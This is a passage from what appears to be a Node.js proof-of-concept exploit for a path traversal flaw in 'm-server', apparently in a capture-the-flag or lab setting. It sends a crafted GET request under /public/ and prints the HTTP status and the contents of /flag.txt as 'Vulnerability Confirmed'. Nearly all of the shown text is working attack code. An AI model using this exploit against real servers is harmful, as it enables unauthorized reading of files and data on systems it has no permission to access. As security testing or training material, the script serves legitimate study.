    console.log('[*] Triggering m-server path traversal vulnerability...');
    console.log(`[+] Injected req.url payload: ${TRAVERSAL_PAYLOAD}`);

    return new Promise((resolve) => {
        const req = http.request({
            hostname: HOST,
            port: PORT,
            // Simulating a request to a route where `req.url` is directly concatenated to rootPath
            path: `/public/${TRAVERSAL_PAYLOAD}`, 
            method: 'GET'
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                console.log(`[!] Vulnerability Confirmed!`);
                console.log(`    HTTP Status: ${res.statusCode}`);
                console.log(`    Accessed /flag.txt content:\n${data}`);
                resolve(data);
            });
        });

